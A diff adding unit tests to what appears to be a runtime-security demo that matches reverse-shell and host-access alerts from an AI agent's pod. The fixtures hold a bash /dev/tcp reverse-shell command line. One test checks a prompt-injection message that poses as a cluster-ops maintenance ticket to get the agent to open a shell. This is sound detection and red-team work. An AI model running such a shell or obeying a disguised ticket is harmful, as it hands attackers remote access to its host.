@@ -7,6 +7,7 @@ import unittest
 from types import SimpleNamespace
 from unittest.mock import Mock, patch
 
+from server.main import build_agent_request_message
 from server.collector import (
     ArgusLogParser,
     EventStore,
@@ -17,7 +18,9 @@ from server.models import (
     NormalizedEvent,
     ScenarioResult,
     classify_scenario,
+    is_runtime_noise,
     native_agent_host_attempt_matches,
+    native_agent_shell_matches,
     native_alert_matches_scenario,
 )
 from server.scenarios import ALLOWED_SCENARIOS, ScenarioController
@@ -91,10 +94,32 @@ class NativeAlertModelTests(unittest.TestCase):
                 event, report, "argus-gtc-agent-abc", "agent-pod-uid", run_id
             )
         )
+        dnat_event = event.model_copy(update={"destination_ip": "10.131.0.19"})
+        self.assertTrue(
+            native_agent_host_attempt_matches(
+                dnat_event, report, "argus-gtc-agent-abc", "agent-pod-uid", run_id
+            )
+        )
+        listener_event = event.model_copy(
+            update={
+                "source_ip": "10.131.0.19",
+                "source_port": 31999,
+                "destination_ip": "10.129.0.42",
+                "destination_port": 41001,
+                "pod_name": "argus-gtc-canary-xyz",
+                "pod_uid": "canary-pod-uid",
+                "process_name": "python",
+            }
+        )
+        self.assertTrue(
+            native_agent_host_attempt_matches(
+                listener_event, report, "argus-gtc-agent-abc", "agent-pod-uid", run_id
+            )
+        )
         for changed_event in (
             event.model_copy(update={"activity_name": "Process Created"}),
             event.model_copy(update={"source_port": 41002}),
-            event.model_copy(update={"destination_ip": "10.6.135.4"}),
+            event.model_copy(update={"destination_port": 4444}),
             event.model_copy(update={"pod_uid": "another-pod"}),
             event.model_copy(update={"evidence_source": "ovn-acl-audit"}),
         ):
@@ -103,6 +128,51 @@ class NativeAlertModelTests(unittest.TestCase):
                     changed_event, report, "argus-gtc-agent-abc", "agent-pod-uid", run_id
                 )
             )
+
+    def test_kata_agent_shell_matches_process_and_native_reverse_shell(self):
+        run_id = "0123456789ab"
+        report = {
+            "source_ip": "10.129.0.42",
+            "source_port": 41001,
+            "destination_ip": "10.6.135.3",
+            "destination_port": 31999,
+            "process_name": f"argus-gtc-agent-shell-{run_id}",
+        }
+        process_event = NormalizedEvent(
+            message_type="EVENT",
+            severity="INFO",
+            activity_name="Process Created",
+            process_name=f"argus-gtc-agent-shell-{run_id}",
+            process_command=f"argus-gtc-agent-shell-{run_id} bash --noprofile --norc -i",
+            pod_name="argus-gtc-agent-abc",
+            pod_uid="agent-pod-uid",
+            scenario_run_id=run_id,
+        )
+        alert = NormalizedEvent(
+            message_type="ALERT",
+            severity="HIGH",
+            activity_name="Reverse Shell Detected",
+            process_name="bash",
+            pod_name="argus-gtc-agent-abc",
+            pod_uid="agent-pod-uid",
+            scenario_run_id=run_id,
+        )
+        other_pod = alert.model_copy(update={"pod_name": "invisible-vm-xyz", "pod_uid": "other"})
+        self.assertTrue(
+            native_agent_shell_matches(
+                process_event, report, "argus-gtc-agent-abc", "agent-pod-uid", run_id
+            )
+        )
+        self.assertTrue(
+            native_agent_shell_matches(
+                alert, report, "argus-gtc-agent-abc", "agent-pod-uid", run_id
+            )
+        )
+        self.assertFalse(
+            native_agent_shell_matches(
+                other_pod, report, "argus-gtc-agent-abc", "agent-pod-uid", run_id
+            )
+        )
 
     def test_audit_evasion_is_allowlisted_and_bounded(self):
         self.assertIn("audit-evasion", ALLOWED_SCENARIOS)
@@ -271,6 +341,134 @@ class NativeAlertModelTests(unittest.TestCase):
         controller = object.__new__(ScenarioController)
         with self.assertRaisesRegex(ValueError, "12 lowercase hexadecimal"):
             controller.run("audit-evasion", "not-a-run-id")
+
+    def test_agent_multiprocessing_fork_is_runtime_noise(self):
+        event = NormalizedEvent(
+            message_type="ALERT",
+            severity="MEDIUM",
+            activity_name="Executable Permissions Removed",
+            process_name="python3.11",
+            process_command=(
+                "/usr/local/bin/python3.11 -c from multiprocessing.spawn "
+                "import spawn_main; spawn_main(tracker_fd=53, pipe_handle=105) "
+                "--multiprocessing-fork"
+            ),
+            node_name="argus-gtc-agent-7656cb8b9c-t7mdf",
+        )
+        self.assertTrue(is_runtime_noise(event))
+        self.assertIsNone(classify_scenario(event, "agent-baseline"))
+        self.assertIsNone(classify_scenario(event, "host-access-attempt"))
+
+    def test_reverse_shell_process_list_prefers_bash_dev_tcp(self):
+        event = normalize_argus_message(
+            {
+                "message_type": "ALERT",
+                "severity": "HIGH",
+                "activity_data": {
+                    "name": "reverse_shell_detected",
+                    "process_list": [
+                        {
+                            "process_details": {
+                                "process_name": "python3.11",
+                                "process_command_line_arguments": (
+                                    "/usr/local/bin/python3.11 -c from multiprocessing.spawn "
+                                    "import spawn_main; spawn_main(tracker_fd=53, "
+                                    "pipe_handle=105) --multiprocessing-fork"
+                                ),
+                            }
+                        },
+                        {
+                            "process_details": {
+                                "process_name": "bash",
+                                "process_command_line_arguments": (
+                                    "argus-gtc-agent-shell-aabbccddeeff bash "
+                                    "--noprofile --norc -i 0<>/dev/tcp/172.30.185.74/31999"
+                                ),
+                                "process_hash_sha256": "abc123def456",
+                                "network_connection_list": [
+                                    {
+                                        "network_connection_details": {
+                                            "protocol": "TCP",
+                                            "connection_state": "ESTABLISHED",
+                                            "local_address": "10.131.0.16",
+                                            "local_port": "41001",
+                                            "peer_address": "172.30.185.74",
+                                            "peer_port": "31999",
+                                        }
+                                    }
+                                ],
+                            }
+                        },
+                    ],
+                },
+                "workload_information": {
+                    "hostname": "argus-gtc-agent-6448bcbb69-g6gjf",
+                    "container_context": {"pod_name": None},
+                },
+            }
+        )
+        self.assertEqual(event.activity_name, "Reverse Shell Detected")
+        self.assertEqual(event.process_name, "bash")
+        self.assertIn("/dev/tcp/", event.process_command)
+        self.assertEqual(event.process_hash_sha256, "abc123def456")
+        self.assertEqual(event.pod_name, "argus-gtc-agent-6448bcbb69-g6gjf")
+        self.assertEqual(event.destination_ip, "172.30.185.74")
+        self.assertEqual(event.destination_port, 31999)
+        self.assertFalse(is_runtime_noise(event))
+
+    def test_piped_python_reverse_shell_is_runtime_noise(self):
+        event = normalize_argus_message(
+            {
+                "message_type": "ALERT",
+                "severity": "HIGH",
+                "activity_data": {
+                    "name": "reverse_shell_detected",
+                    "process_list": [
+                        {
+                            "process_details": {
+                                "process_name": "python3.11",
+                                "process_command_line_arguments": (
+                                    "/usr/local/bin/python3.11 -c from multiprocessing.spawn "
+                                    "import spawn_main; spawn_main(tracker_fd=53, "
+                                    "pipe_handle=105) --multiprocessing-fork"
+                                ),
+                            }
+                        },
+                        {
+                            "process_details": {
+                                "process_name": "pod",
+                                "process_command_line_arguments": "/usr/bin/pod",
+                            }
+                        },
+                    ],
+                },
+                "workload_information": {
+                    "hostname": "argus-gtc-agent-76dd69dd6d-2x9tz",
+                },
+            }
+        )
+        self.assertEqual(event.activity_name, "Reverse Shell Detected")
+        self.assertTrue(is_runtime_noise(event))
+        self.assertIsNone(classify_scenario(event, "host-access-attempt"))
+
+    def test_injection_prompt_is_a_pasted_ticket_not_a_summary_request(self):
+        run_id = "aabbccddeeff"
+        message = build_agent_request_message("prompt-injection", run_id)
+        lowered = message.lower()
+        self.assertIn("maintenance note", lowered)
+        self.assertIn("from: cluster-ops", lowered)
+        self.assertIn("open_demo_shell", message)
+        self.assertIn(run_id, message)
+        self.assertIn("authorized demo shell check", lowered)
+        self.assertNotIn("untrusted", lowered)
+        self.assertNotIn("summarize", lowered)
+        self.assertNotIn("ignore the earlier", lowered)
+        self.assertNotIn("argus visibility", lowered)
+        self.assertNotIn("[ticket]", lowered)
+        self.assertNotIn("-----", message)
+        baseline = build_agent_request_message("baseline", run_id)
+        self.assertIn("Do not use tools.", baseline)
+        self.assertNotIn("open_demo_shell", baseline)
 
     def test_empty_pod_context_matches_only_exact_native_high(self):
         event = shell_history_alert()
